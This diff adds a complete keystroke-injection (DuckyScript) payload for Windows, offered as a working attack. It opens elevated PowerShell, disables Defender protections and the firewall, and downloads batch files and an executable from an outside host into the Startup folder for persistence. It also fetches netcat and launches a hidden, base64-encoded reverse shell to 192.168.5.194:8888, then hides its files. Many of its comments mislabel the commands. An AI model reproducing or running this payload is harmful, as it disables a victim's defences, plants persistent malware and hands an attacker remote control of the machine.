@@ -1,0 +1,148 @@
+REM Send an empty key press
+DELAY 2000
+
+REM Press the left Win key
+GUI r
+DELAY 600
+
+REM Enter the powershell command and press Ctrl+Shift+Enter
+STRING powershell
+DELAY 600
+CTRL SHIFT ENTER
+
+REM Delay for 0.5 seconds
+DELAY 500
+
+REM Send the left arrow key
+LEFTARROW
+DELAY 600
+
+REM Send the Enter key
+ENTER
+DELAY 600
+
+REM Run the command
+STRING Start-Process powershell -Verb RunAs
+ENTER
+DELAY 600
+
+REM Execute the command to hide the powershell window
+STRING Start-Process powershell -WindowStyle Hidden
+ENTER
+DELAY 600
+
+STRING PowerShell.exe -command "Set-MpPreference -RealTimeScan Disable"
+ENTER
+DELAY 600
+
+STRING PowerShell.exe -command "Set-MpPreference -EnableControlledFolderAccess Disabled"
+ENTER
+DELAY 600
+
+STRING PowerShell.exe -command "Set-MpPreference -PUAProtection disable"
+ENTER
+DELAY 600
+
+STRING PowerShell.exe -command "Add-MpPreference -Exclusion 360.exe"
+ENTER
+DELAY 600
+
+REM Execute the command to download a file
+STRING Invoke-WebRequest -Uri "https://dl-v1.feejii.com/202401222128/decb8c46d086cce31522d92fd6a36905/storage/files/2024/01/22/2/13596172/1705929617395000000002.gz?ExampleFile.ps1" -OutFile "C:\Windows\ExampleFile.ps1"
+ENTER
+DELAY 600
+
+REM Execute the command to download a file
+STRING Invoke-WebRequest -Uri "https://dl-v1.feejii.com/202401222128/d28d69efcc237c4f0727eb693626e2fc/storage/files/2024/01/22/2/13596172/1705929617394000000001.gz?1_converted.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1_converted.bat"
+ENTER
+DELAY 600
+
+REM Execute the command to download a file
+STRING Invoke-WebRequest -Uri "https://dl-v1.feejii.com/202401222127/e301a713bd317369c8d82a9a82975421/storage/files/2024/01/22/2/13596172/1705929617393000000000.gz?1.bat" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1.bat"
+ENTER
+DELAY 600
+
+REM Execute the command to download a file
+STRING Invoke-WebRequest -Uri "https://dl-v1.feejii.com/202401222129/191ee4c3d7f5fd1a2d1f82f9faa635ee/storage/files/2024/01/22/2/13596172/1705929633513000000003.gz?Server.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Server.exe"
+ENTER
+DELAY 600
+
+REM Disable the firewall
+STRING Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+ENTER
+DELAY 600
+
+REM Execute the command to download a file
+STRING Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" -OutFile "C:\1.zip"
+ENTER
+DELAY 600
+
+REM Execute the command to extract the file
+STRING Expand-Archive -Path "C:\1.zip" -DestinationPath "C:\"
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING cd "C:\netcat-1.11"
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING $cmd = "while (`$true) { & nc 192.168.5.194 8888 -e powershell.exe }"
+ENTER
+DELAY 600
+
+STRING $bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
+ENTER
+DELAY 600
+
+STRING $encodedCommand = [Convert]::ToBase64String($bytes)
+ENTER
+DELAY 600
+
+STRING $bytes = [System.Text.Encoding]::Unicode.GetBytes("powershell -EncodedCommand $encodedCommand")
+ENTER
+DELAY 600
+
+STRING $encodedCommand = [Convert]::ToBase64String($bytes)
+ENTER
+DELAY 600
+
+STRING Start-Process -WindowStyle Hidden -FilePath powershell.exe -ArgumentList "-EncodedCommand", $encodedCommand
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING Set-ItemProperty -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1_converted.bat" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING Set-ItemProperty -Path "C:\netcat-1.11" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING Set-ItemProperty -Path "C:\1.zip" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING Set-ItemProperty -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\1.bat" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING Set-ItemProperty -Path "C:\Windows\ExampleFile.ps1" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING Set-ItemProperty -Path "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Server.exe" -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
+ENTER
+DELAY 600
+
+REM Execute the command to enter a specific directory
+STRING C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\Server.exe
+ENTER
+DELAY 600
